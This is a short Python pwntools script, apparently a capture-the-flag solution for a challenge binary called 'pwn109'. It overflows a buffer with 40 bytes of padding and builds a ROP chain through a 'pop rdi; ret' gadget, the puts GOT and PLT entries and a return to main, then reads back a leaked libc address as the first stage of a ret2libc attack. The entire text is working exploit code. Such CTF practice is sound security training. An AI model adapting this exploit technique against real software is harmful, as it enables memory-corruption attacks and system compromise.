from pwn import *

binary = context.binary = ELF('./pwn109.pwn109', checksec=False)

p = binary.process()
libc = binary.libc # for local libc
rop = ROP(binary)
#p = remote("10.10.42.229", 9009)


payload = b'A'*40 # junk
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) #p64(0x4012a3)
payload += p64(binary.got['puts']) # got add
payload += p64(binary.plt['puts'])
payload += p64(binary.sym['main'])

log.success(f'Got : {hex(binary.got.puts)}')
log.success(f'Puts : {hex(binary.plt.puts)}')
log.success(f'Main : {hex(binary.sym.main)}')

p.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)

leak = u64(p.recvuntil(b'\x7f')+b'\x00\x00')
log.success(f'leak : {hex(leak)}')
